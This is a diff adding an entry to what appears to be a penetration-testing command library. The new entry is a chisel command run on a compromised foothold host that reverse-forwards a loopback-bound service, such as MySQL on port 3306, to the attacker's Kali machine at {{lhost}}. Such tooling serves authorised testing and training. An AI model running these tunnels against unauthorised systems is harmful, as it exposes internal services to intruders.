@@ -38,6 +38,12 @@
         {
           "tool": "chisel",
           "run": "chisel client {{lhost}}:8080 R:socks"
+        },
+        {
+          "tool": "chisel",
+          "locus": "onhost",
+          "run": "./chisel client {{lhost}}:8080 R:{{local_port|3306}}:127.0.0.1:{{local_port|3306}}",
+          "note": "Forward a single loopback-bound service on the foothold host (such as 127.0.0.1:3306 or 127.0.0.1:8080) directly back to 127.0.0.1 on Kali."
         }
       ]
     },
